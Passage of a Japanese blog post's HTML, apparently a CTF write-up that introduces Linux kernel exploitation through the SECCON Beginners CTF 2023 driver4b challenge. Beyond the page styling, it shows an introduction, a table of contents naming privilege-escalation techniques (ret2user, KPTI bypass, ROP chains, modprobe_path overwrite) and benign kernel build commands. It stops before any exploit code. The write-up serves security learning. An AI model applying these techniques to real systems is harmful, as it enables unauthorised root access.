<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.e71379dda153709d1a9a.css" id="gatsby-global-css">html{font-size:100}body{margin:0 0 0 calc(100vw - 100%);color:#222;line-height:1.4;font-size:.875rem;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fcfcfc}body,h1,h2,h3,h4,h5,h6{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif}h1,h2,h3,h4,h5,h6{font-weight:600}h1{font-size:1.575rem;line-height:2.25rem;margin-top:5rem;margin-bottom:1.25rem}h2{font-size:1.47656rem;line-height:1.875rem}h2,h3{margin-top:2.5rem;margin-bottom:.625rem}h3{font-size:1.20313rem;line-height:1.25rem}h4{font-size:1.05rem;margin-top:1.875rem}h4,h5{line-height:1.25rem;margin-bottom:.625rem}h5,h6{font-size:.875rem;margin-top:3.125rem}h6{line-height:1.25rem;margin-bottom:.625rem}img{max-width:100%;margin:inherit auto}hr,img{border:0;display:block}hr{color:#222;height:1.625rem;margin:3.25rem auto;background-size:100% 26px;background-image:linear-gradient(180deg,transparent 1px,transparent 11px,#222 0,#222 15px,transparent 0,transparent 26px);width:6.25rem}a{color:#918d40;text-decoration:none}a:active,a:focus,a:hover{color:#a9d159}b,strong{font-weight:600}ul{list-style:square;margin-bottom:1.25rem}ul li{padding:0 .3125rem;margin-bottom:.625rem}p{line-height:1.25rem;margin-bottom:1.25rem}blockquote{font-style:italic;text-align:center;background-color:#f5f5f5;padding:.1875rem .625rem}figure{display:block;width:100%;height:auto}figcaption{line-height:.9375rem;margin-top:.3125rem;color:#222;font-size:.75rem;font-style:italic;margin-bottom:0;text-align:center}.anchor{margin-left:-1.875rem!important;padding-right:.875rem!important}@media screen and (min-width:685px){figure.float-left,figure.float-right{max-width:19.375rem;padding:0 1.25rem}.float-right{float:right}.float-left{float:left}}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}li>code[class*=language-text],p>code[class*=language-text]{background:#f9f9f9!important;color:#2d2d2d!important}.Author-module--author__photo--36xCH{display:inline-block;margin-bottom:0;border-radius:50%;background-clip:padding-box}.Author-module--author__title--2CaTb{font-size:.98438rem;font-weight:600;line-height:1.40625rem;margin:.625rem 0}.Author-module--author__title-link--Yrism,.Author-module--author__title-link--Yrism:focus,.Author-module--author__title-link--Yrism:hover{color:#222}.Author-module--author__subtitle--cAaEB{color:#888;line-height:1.25rem;margin-bottom:1.25rem}.Icon-module--icon--Gpyvw{display:inline-block;width:1em;height:1em;stroke-width:0;stroke:currentColor;fill:currentColor;font-style:normal;font-weight:400;speak:none;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.Contacts-module--contacts--1rGd1{margin-bottom:1.25rem}.Contacts-module--contacts__list--3OgdW{display:flex;flex-flow:row wrap;flex-grow:0;flex-shrink:0;list-style:none;padding:0;margin:.625rem -.1875rem;width:8.75rem}.Contacts-module--contacts__list-item--16p9q{padding:0;margin:.25rem;display:flex;align-content:center;align-items:center;justify-content:center;height:2.1875rem;width:2.1875rem;line-height:2.1875rem;border-radius:50%;text-align:center;border:1px solid #ebebeb}.Contacts-module--contacts__list-item-link--2MIDn{border:0;display:flex;color:#222}.Contacts-module--contacts__list-item-link--2MIDn:focus,.Contacts-module--contacts__list-item-link--2MIDn:hover{color:#918d40}.Copyright-module--copyright--1ariN{color:#b6b6b6;font-size:.75rem}.Menu-module--menu--Efbin{margin-bottom:1.25rem}.Menu-module--menu__list--31Zeo{list-style:none;padding:0;margin:0}.Menu-module--menu__list-item--1lJ6B{padding:0;margin:.625rem 0}.Menu-module--menu__list-item-link--10Ush{font-size:.875rem;color:#222;font-weight:400;border:0}.Menu-module--menu__list-item-link--10Ush:focus,.Menu-module--menu__list-item-link--10Ush:hover{color:#918d40;border-bottom:1px solid #918d40}.Menu-module--menu__list-item-link--active--2CbUO{color:#222;border-bottom:1px solid #222}.Sidebar-module--sidebar--X4z2p{width:100%}.Sidebar-module--sidebar__inner--Jdc5s{position:relative;padding:1.5625rem 1.25rem 0}.Sidebar-module--headerimage--19Rdy{width:100%;min-height:70px;max-height:120px;margin:0 0 .625rem}.Sidebar-module--logo-image--XDYae{min-height:70px;max-height:120px;margin:0 auto}input{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:.625rem;margin:.3125rem 0;border:1px solid #999;border-radius:.3125rem}.Sidebar-module--search-container--17C6F{position:relative}.Sidebar-module--search-container-input--27Tw4{width:100%}.Sidebar-module--search-container-submit--WwtLg{position:absolute;width:2.375rem;height:2.375rem;top:calc(50% - 19px);right:0;border:3px solid #999;border-radius:0 .25rem .25rem 0;background:#999}.Sidebar-module--search-container-submit--WwtLg:before{position:absolute;content:"";width:.9375rem;height:.9375rem;top:calc(50% - 9px);left:calc(50% - 9px);border-radius:50%;box-shadow:0 0 0 2px #fff}.Sidebar-module--search-container-submit--WwtLg:after{position:absolute;content:"";width:.5rem;height:.375rem;top:calc(50% + 6px);left:calc(50% + 2px);border-top:2px solid #fff;transform:rotate(45deg)}@media screen and (min-width:685px){.Sidebar-module--sidebar--X4z2p{width:calc(41.625% - 1.09375rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(12n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(12n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:1.875rem 1.25rem 0}.Sidebar-module--sidebar__inner--Jdc5s:after{background:#e6e6e6;background:linear-gradient(180deg,#e6e6e6 0,#e6e6e6 48%,#fff);position:absolute;content:"";width:.0625rem;height:33.75rem;top:30px;right:-10px;bottom:0}}@media screen and (min-width:960px){.Sidebar-module--sidebar--X4z2p{width:calc(33.3% - 1.25rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(3n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(3n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:2.5rem}}.Layout-module--layout--3Pyz6{max-width:66.875rem;margin-left:auto;margin-right:auto}.Layout-module--layout--3Pyz6:before{content:"";display:table}.Layout-module--layout--3Pyz6:after{content:"";display:table;clear:both}.Feed-module--feed__item--2D5rE{margin-bottom:1.5625rem}.Feed-module--feed__item--2D5rE:last-child{margin-bottom:.625rem}.Feed-module--feed__item-title--3nigr{font-size:1.47656rem;line-height:1.875rem;margin-top:0;margin-bottom:.625rem}.Feed-module--feed__item-title-link--iFMRs{color:#222}.Feed-module--feed__item-title-link--iFMRs:focus,.Feed-module--feed__item-title-link--iFMRs:hover{color:#222;border-bottom:1px solid #222}.Feed-module--feed__item-description--1uO8e{font-size:.875rem;line-height:1.25rem;margin-bottom:.9375rem}.Feed-module--feed__item-meta-time--3t1fg{font-size:.75rem;color:#222;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-divider--N-Q0A{margin:0 .3125rem}.Feed-module--feed__item-meta-category-link--23f8F{font-size:.75rem;color:#a9d159;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-category-link--23f8F:focus,.Feed-module--feed__item-meta-category-link--23f8F:hover{color:#918d40}.Feed-module--feed__item-readmore--1u6bI{font-size:.875rem;color:#918d40}.Feed-module--feed__item-readmore--1u6bI:focus,.Feed-module--feed__item-readmore--1u6bI:hover{color:#918d40;border-bottom:1px solid #918d40}.Page-module--page--2nMky{margin-bottom:2.5rem}.Page-module--page__inner--2M_vz{padding:1.5625rem 1.25rem}.Page-module--page__title--GPD8L{font-size:1.575rem;font-weight:600;line-height:2.5rem;margin-top:0;margin-bottom:1.8125rem}.Page-module--page__body--Ic6i6{font-size:.875rem;line-height:1.25rem;margin:0 0 1.25rem}@media screen and (min-width:685px){.Page-module--page--2nMky{width:calc(58.275% - .78125rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(12n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(12n+1){clear:both}.Page-module--page__inner--2M_vz{padding:1.875rem 1.25rem}}@media screen and (min-width:960px){.Page-module--page--2nMky{width:calc(66.6% - .625rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(3n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(3n+1){clear:both}.Page-module--page__inner--2M_vz{padding:2.5rem 2.1875rem}}.Pagination-module--pagination--2H3nO{margin-top:2.5rem;display:flex}.Pagination-module--pagination__prev--bet5s{width:50%;text-align:left}.Pagination-module--pagination__prev-link--1Nzs6{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__prev-link--1Nzs6:focus,.Pagination-module--pagination__prev-link--1Nzs6:hover{color:#918d40}.Pagination-module--pagination__prev-link--disable--Yklx9{pointer-events:none;color:#bbb}.Pagination-module--pagination__next--3hFiN{width:50%;text-align:right}.Pagination-module--pagination__next-link--3FUtA{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__next-link--3FUtA:focus,.Pagination-module--pagination__next-link--3FUtA:hover{color:#918d40}.Pagination-module--pagination__next-link--disable--30UwZ{pointer-events:none;color:#bbb}.Author-module--author--2Yefr{border-top:1px solid #e6e6e6;max-width:43.75rem;padding-top:1.25rem;line-height:1.25rem;margin-top:1.25rem;margin-bottom:2.5rem}.Author-module--author__bio-twitter--n-O9n{display:block;text-decoration:underline}@media screen and (min-width:685px){.Author-module--author--2Yefr{margin-left:auto;margin-right:auto}}.Content-module--content--3p512{max-width:62.8125rem;padding:0 .9375rem;margin:0 auto}.Content-module--content__title--2BDW9{font-size:1.75rem;max-width:43.75rem;font-weight:600;text-align:center;line-height:2.0625rem;margin:1.25rem auto 0}.Content-module--content__body--2TrQ- figure{margin-bottom:1.25rem}.Content-module--content__body--2TrQ- figure blockquote{font-style:italic;text-align:center;margin-top:0;padding:1.25rem 0}.Content-module--content__body--2TrQ- figure blockquote p{max-width:43.75rem;font-size:1.47149rem;margin-top:1.25rem;margin-bottom:1.25rem;line-height:1.875rem}.Content-module--content__body--2TrQ- a{text-decoration:underline}.Content-module--content__body--2TrQ- *{max-width:43.75rem;margin-left:auto;margin-right:auto}.Content-module--content__body--2TrQ- img{max-width:100%;margin-top:.625rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- li ul{margin-bottom:.625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- h2{position:relative;padding:1rem 1.5rem;color:#fff;border-radius:.625rem;background:#0c0000}.Content-module--content__body--2TrQ- h2:after{position:absolute;bottom:-9px;left:1rem;width:0;height:0;content:"";border-color:#0c0000 transparent transparent;border-style:solid;border-width:10px 10px 0}.Content-module--content__body--2TrQ- h3{border-bottom:3px dotted #0c0000;padding:1rem 0}@media screen and (min-width:960px){.Content-module--content--3p512{padding:0}.Content-module--content__title--2BDW9{font-size:1.75rem;line-height:2.8125rem;margin-top:2.8125rem;margin-bottom:1.875rem}.Content-module--content__body--2TrQ-,.Content-module--content__body--2TrQ- p{font-size:.98438rem;line-height:1.40625rem;margin-bottom:1.40625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}}.Meta-module--meta__date--29eD7{font-style:italic}.Tags-module--tags--1L_ct{margin-bottom:.625rem}.Tags-module--tags__list--91FqN{list-style:none;margin:0 -.625rem;padding:0}.Tags-module--tags__list-item--1M30P{display:inline-block;margin:.625rem .3125rem}.Tags-module--tags__list-item-link--3SL_8{display:inline-block;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;border:1px solid #e6e6e6;text-decoration:none;border-radius:1.25rem;color:#222}.Tags-module--tags__list-item-link--3SL_8:focus,.Tags-module--tags__list-item-link--3SL_8:hover{color:#918d40}.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{max-width:43.75rem;margin:0 auto;padding:0 .9375rem}.Post-module--post__home-button--16Kl0{display:block;max-width:5.625rem;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;text-align:center;color:#222;border:1px solid #e6e6e6;border-radius:1.25rem;font-size:.875rem;font-weight:400;margin-left:auto;margin-right:auto;margin-top:1.25rem}.Post-module--post__home-button--16Kl0:focus,.Post-module--post__home-button--16Kl0:hover{color:#918d40}@media screen and (min-width:960px){.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{padding:0}.Post-module--post__home-button--16Kl0{position:fixed;max-width:auto;margin:0;top:30px;left:30px}}</style><meta name="generator" content="Gatsby 2.32.13"/><link rel="alternate" type="application/rss+xml" title="かえるのひみつきち" href="/rss.xml"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-122086587-6"></script><script>
      
      
      if(true) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){window.dataLayer && window.dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-122086587-6', {"send_page_view":false});
      }
      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">sec4b-2023 の driver4b で Linux のカーネルエクスプロイトに入門してみる - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="SECCON Beginners CTF 2023 の driver4b でカーネルエクスプロイトに入門します。"/><meta data-react-helmet="true" property="og:site_name" content="sec4b-2023 の driver4b で Linux のカーネルエクスプロイトに入門してみる - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/4e218e546489ec90c1e27e98a5bb857d/ctf-sec4b-kernel-exploit.png"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="sec4b-2023 の driver4b で Linux のカーネルエクスプロイトに入門してみる - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="SECCON Beginners CTF 2023 の driver4b でカーネルエクスプロイトに入門します。"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/4e218e546489ec90c1e27e98a5bb857d/ctf-sec4b-kernel-exploit.png"/><link as="script" rel="preload" href="/webpack-runtime-a3c0f166cb4b802ff58f.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-46fc1da9fa41dea5027d.js"/><link as="script" rel="preload" href="/app-4527e0a718e3bd88d288.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/ctf-sec4b-kernel-exploit/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">sec4b-2023 の driver4b で Linux のカーネルエクスプロイトに入門してみる</h1><div class="Content-module--content__body--2TrQ-"><p>6/3 から開催されていた SECCON Beginners CTF 2023 で出題された driver4b をテーマに、Linux のカーネルエクスプロイトについて学んでみようと思います。</p>
<p>driver4b は Linux のカーネルエクスプロイトをテーマにしたエントリレベルの問題でした。</p>
<p>コンテスト中は残念ながらあと一歩 Flag を取るまでに至らず悔しい思いをしたので、本棚の肥やしになってた詳解 Linux カーネルを片手に前提知識を含めて学んでいくことにしました。</p>
<p>driver4b で攻撃する対象は x86<em>64 のカーネル上で動作するカーネルドライバですので、今回の内容も x86</em>64 を対象とすることにします。</p>
<!-- omit in toc -->
<h2 id="もくじ" style="position:relative;"><a href="#%E3%82%82%E3%81%8F%E3%81%98" aria-label="もくじ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>もくじ</h2>
<ul>
<li><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%92%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B">カーネルをビルドする</a></li>
<li>
<p><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90">カーネルモジュール(デバイスドライバ)</a></p>
<ul>
<li><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%AE%E5%AE%9F%E4%BD%93">カーネルモジュール(デバイスドライバ)の実体</a></li>
<li><a href="#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E7%94%A8%E6%84%8F%E3%81%99%E3%82%8B">デバイスファイルを用意する</a></li>
</ul>
</li>
<li><a href="#%E3%83%A1%E3%83%A2%E3%83%AA%E3%82%A2%E3%83%89%E3%83%AC%E3%83%83%E3%82%B7%E3%83%B3%E3%82%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6">メモリアドレッシングについて</a></li>
<li>
<p><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E6%A9%9F%E6%A7%8B%E3%81%AE%E6%9C%89%E7%84%A1%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B">カーネルのセキュリティ機構の有無を特定する</a></p>
<ul>
<li><a href="#smep-supervisor-mode-execution-prevention">SMEP (Supervisor Mode Execution Prevention)</a></li>
<li><a href="#smap-supervisor-mode-access-prevention">SMAP (Supervisor Mode Access Prevention)</a></li>
<li><a href="#kaslrfgkaslr">KASLR、FGKASLR</a></li>
<li><a href="#kpti-kernel-page-table-isolation">KPTI (Kernel Page-Table Isolation)</a></li>
<li><a href="#kadr-kernel-address-display-restriction">KADR (Kernel Address Display Restriction)</a></li>
</ul>
</li>
<li>
<p><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E5%95%8F%E3%81%AE%E3%82%A2%E3%83%97%E3%83%AD%E3%83%BC%E3%83%81">カーネルエクスプロイト問のアプローチ</a></p>
<ul>
<li><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A1%E3%83%A2%E3%83%AA%E7%A9%BA%E9%96%93%E3%81%AE%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B">カーネルメモリ空間のアドレスを特定する</a></li>
<li><a href="#bazimage-%E3%81%8B%E3%82%89-vmlinux-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B">bazImage から vmlinux を取得する</a></li>
<li><a href="#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%92%E7%B7%A8%E9%9B%86%E3%81%97%E3%81%A6%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%92%E9%85%8D%E7%BD%AE%E3%81%99%E3%82%8B">ファイルシステムを編集してバイナリを配置する</a></li>
</ul>
</li>
<li>
<p><a href="#driver4bpwn">driver4b(Pwn)</a></p>
<ul>
<li><a href="#%E5%95%8F%E9%A1%8C%E3%81%AE%E6%A6%82%E8%A6%81%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6">問題の概要について</a></li>
<li><a href="#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B">デバイスドライバを調べる</a></li>
<li><a href="#module_ioctl-%E3%82%92%E8%AA%AD%E3%82%80">module_ioctl を読む</a></li>
<li><a href="#root-%E6%A8%A9%E9%99%90%E3%81%A7-shell-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8Bret2user">root 権限で Shell を取得する(ret2user)</a></li>
<li><a href="#kpti-%E3%81%AE%E5%9B%9E%E9%81%BF">KPTI の回避</a></li>
<li><a href="#rop-chains-%E3%81%AE%E4%BD%9C%E6%88%90">ROP Chains の作成</a></li>
<li><a href="#init_cred-%E3%81%AE%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B">init_cred のアドレスを特定する</a></li>
<li><a href="#root-%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B">root シェルを取得する</a></li>
<li><a href="#modprobe_path-%E3%81%AE%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%AB%E3%82%88%E3%82%8B%E4%BB%BB%E6%84%8F%E3%81%AE%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E5%AE%9F%E8%A1%8C">modprobe_path の書き換えによる任意のスクリプト実行</a></li>
<li><a href="#modprobe_path-%E3%81%A8%E3%81%AF">modprobe_path とは</a></li>
<li><a href="#modprobe_path-%E3%81%AE%E6%82%AA%E7%94%A8%E3%81%8C%E5%8F%AF%E8%83%BD%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B">modprobe_path の悪用が可能かどうか</a></li>
</ul>
</li>
<li><a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ</a></li>
</ul>
<h2 id="カーネルをビルドする" style="position:relative;"><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%92%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B" aria-label="カーネルをビルドする permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>カーネルをビルドする</h2>
<p>まず、以下のソースなどから Linux のバージョンを確認しておきます。</p>
<p>参考：<a href="https://elixir.bootlin.com/linux/latest/source/kernel" target="_blank" rel="nofollow noopener noreferrer">kernel - Linux source code (v6.3.6) - Bootlin</a></p>
<p>次に、以下からダウンロードした Buildroot  ツールを展開します。</p>
<p>参考：<a href="https://buildroot.org/download.html" target="_blank" rel="nofollow noopener noreferrer">Buildroot - Making Embedded Linux Easy</a></p>
<p>この時、以下に記載の依存パッケージを事前にインストールしておきます。</p>
<p>参考：<a href="https://buildroot.org/downloads/manual/manual.html#_about_buildroot" target="_blank" rel="nofollow noopener noreferrer">The Buildroot user manual</a></p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">make</span> binutils build-essential diffutils gcc g++ patch <span class="token function">gzip</span> <span class="token function">bzip2</span> perl <span class="token function">tar</span> cpio <span class="token function">unzip</span> <span class="token function">rsync</span> <span class="token function">file</span> <span class="token function">bc</span> findutils <span class="token function">wget</span> -y</code></pre></div>
<p>カーネルのビルドのため、ビルドオプションを設定します。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># ビルドオプションの設定</span>
<span class="token function">make</span> qemu_x86_64_defconfig
<span class="token function">make</span> menuconfig</code></pre></div>
